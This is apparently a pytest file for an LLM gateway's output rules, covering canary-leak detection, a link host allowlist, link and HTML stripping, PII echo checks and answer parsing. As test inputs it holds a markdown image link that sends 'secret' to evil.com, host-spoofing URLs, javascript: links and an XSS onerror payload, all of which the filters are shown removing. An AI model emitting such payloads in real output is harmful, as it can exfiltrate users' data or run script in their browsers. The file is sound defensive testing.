from __future__ import annotations

import base64

import pytest

from guarded_llm_gateway.output_rules import (
    EMAIL_REMOVED,
    LINK_REMOVED,
    SchemaError,
    apply_output_rules,
    contains_canary,
    filter_links,
    host_allowed,
    parse_answer,
    pii_echo_spans,
)
from guarded_llm_gateway.schemas import ModelAnswer

ALLOWED = ("help.tallowbrook.example", "tallowbrook.example")
CANARY = "TB-CANARY-0123456789abcdef"


@pytest.mark.parametrize(
    "leak",
    [
        f"the marker is {CANARY}",
        "T B - C A N A R Y - 0 1 2 3 4 5 6 7 8 9 a b c d e f",
        "0123456789abcdef",
        "fedcba9876543210",
        base64.b64encode(CANARY.encode()).decode(),
    ],
)
def test_canary_variants_are_caught(leak: str) -> None:
    assert contains_canary(leak, CANARY)


def test_canary_absent() -> None:
    assert not contains_canary("Plus costs $5.00 a month.", CANARY)


@pytest.mark.parametrize(
    ("url", "ok"),
    [
        ("https://help.tallowbrook.example/articles/x", True),
        ("https://tallowbrook.example", True),
        ("https://evil.example/x", False),
        ("https://help.tallowbrook.example@evil.com/", False),
        ("https://help.tallowbrook.example.evil.com/", False),
        ("javascript:alert(1)", False),
        ("data:text/html,hi", False),
    ],
)
def test_host_allowlist(url: str, ok: bool) -> None:
    assert host_allowed(url, ALLOWED) is ok


def test_markdown_image_exfil_is_removed() -> None:
    report = filter_links("Done ![x](https://evil.com/p?d=secret) ok", ALLOWED)
    assert "evil.com" not in report.text
    assert report.removed == 1


def test_links_emails_and_html_are_filtered() -> None:
    text = (
        "See [fees](https://help.tallowbrook.example/a) or [here](http://evil.com). "
        "Visit https://evil.com/x and www.bad.org. Mail contact@contact.com or "
        "support@tallowbrook.example. <img src=x onerror=alert(1)> <PERSON>"
    )
    report = filter_links(text, ALLOWED)
    assert "(https://help.tallowbrook.example/a)" in report.text
    assert "evil.com" not in report.text
    assert "bad.org" not in report.text
    assert "contact@contact.com" not in report.text
    assert EMAIL_REMOVED in report.text
    assert LINK_REMOVED in report.text
    assert "support@tallowbrook.example" in report.text
    assert "<img" not in report.text
    assert "<PERSON>" in report.text  # redaction placeholders are not HTML
    assert report.removed == 5
    assert f"{LINK_REMOVED}. Mail" in report.text  # trailing punctuation survives


def test_pii_echo_keeps_bank_contacts_and_catches_context_values() -> None:
    text = "Call +1 555 0142 or 555-867-5309, card 4111 1111 1111 1111, hi Jane Roe"
    spans = pii_echo_spans(text, ["Jane Roe"], ["+1 555 0142"])
    values = [s.text(text) for s in spans]
    assert "+1 555 0142" not in values
    assert "555-867-5309" in values
    assert "4111 1111 1111 1111" in values
    assert "Jane Roe" in values


def test_parse_answer_accepts_fenced_json() -> None:
    answer = parse_answer('```json\n{"answer": "Hi", "citations": ["a"], "escalate": false}\n```')
    assert answer == ModelAnswer(answer="Hi", citations=["a"], escalate=False)


@pytest.mark.parametrize(
    "raw",
    [
        "not json",
        '{"answer": ""}',
        '{"answer": "x", "extra": 1}',
        '{"answer": "x", "citations": "a"}',
    ],
)
def test_parse_answer_rejects_bad_replies(raw: str) -> None:
    with pytest.raises(SchemaError):
        parse_answer(raw)


def test_apply_output_rules_blocks_canary_and_filters_citations() -> None:
    answer = ModelAnswer(answer="ok", citations=["plan-plus", "made-up"])
    verdict = apply_output_rules(
        answer.model_dump_json(),
        answer,
        canary=CANARY,
        retrieved_ids=["plan-plus"],
        allowed_domains=ALLOWED,
        allowed_pii=(),
    )
    assert verdict.blocked_by is None
    assert verdict.citations == ["plan-plus"]
    leaked = ModelAnswer(answer=f"marker {CANARY}")
    verdict = apply_output_rules(
        leaked.model_dump_json(),
        leaked,
        canary=CANARY,
        retrieved_ids=[],
        allowed_domains=ALLOWED,
        allowed_pii=(),
    )
    assert verdict.blocked_by == "output_canary"
    assert verdict.answer == ""
